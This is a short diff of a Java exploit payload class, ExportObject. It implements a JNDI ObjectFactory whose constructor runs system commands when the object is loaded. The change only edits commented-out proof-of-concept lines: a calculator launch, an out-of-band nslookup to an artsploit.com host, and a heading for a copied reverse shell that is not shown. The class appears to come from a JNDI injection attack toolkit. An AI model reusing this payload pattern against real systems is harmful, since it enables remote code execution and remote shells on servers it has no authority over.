@@ -16,9 +16,10 @@ import java.util.Hashtable;
 public class ExportObject implements javax.naming.spi.ObjectFactory {
     public ExportObject() {
         try {
+
             //oob check
 //            Runtime.getRuntime().exec("nslookup jndi.x.artsploit.com");
-//            Runtime.getRuntime().exec("calc.exe");
+            //Runtime.getRuntime().exec("xcalc");
 
             //Pure Groovy/Java Reverse Shell
             //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
